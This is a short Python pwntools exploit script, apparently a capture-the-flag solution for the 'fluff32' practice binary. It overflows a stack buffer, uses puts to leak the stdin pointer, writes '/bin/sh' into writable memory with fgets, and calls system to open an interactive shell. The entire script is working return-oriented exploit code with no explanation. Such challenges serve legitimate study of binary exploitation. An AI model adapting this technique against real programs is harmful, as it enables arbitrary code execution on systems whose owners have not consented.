from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = "debug"
p = process("./fluff32")
elf = ELF("./fluff32")

puts_plt = elf.plt["puts"]
fgets_plt = elf.plt["fgets"]
system_plt = elf.plt["system"]
pwnme = elf.sym["pwnme"]
stdin_addr = 0x804A060
p3p = 0x080486f9
p1p = 0x080483e1

payload = 0x28 * "a" + 4 * "b" 
payload += p32(puts_plt) + p32(pwnme) + p32(stdin_addr)
p.recvuntil("> ")
p.sendline(payload)
stdin = u32(p.recv(4))
log.info(hex(stdin))
temp = 0x0804A000 + 0x200
payload2 = 0x28 * "a" + 4 * "b" 
payload2 += p32(fgets_plt) + p32(p3p) + p32(temp) + p32(100) + p32(stdin)
# payload2 += p32(0x804865A) + p32(temp)
payload2 += p32(system_plt) + "a" * 4 + p32(temp)

p.recvuntil("> ")
p.sendline(payload2)

p.sendline("/bin/sh\x00")

p.interactive()
